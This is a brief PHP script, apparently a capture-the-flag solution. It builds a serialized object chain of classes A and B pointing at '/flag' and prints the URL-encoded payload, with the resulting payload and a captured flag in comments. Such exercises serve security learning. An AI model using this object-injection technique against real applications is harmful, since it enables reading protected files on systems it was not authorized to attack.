<?php
class A{
    var $a;
}
class B{
    var $b;
    var $c;
}

$a = new A();
$b = new B();
$b->b = $a;
$b->c = "/flag";
echo urlencode(serialize($b));
// O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22b%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BN%3B%7Ds%3A1%3A%22c%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D
// flag{qaz12sx3dd4dtr}


?>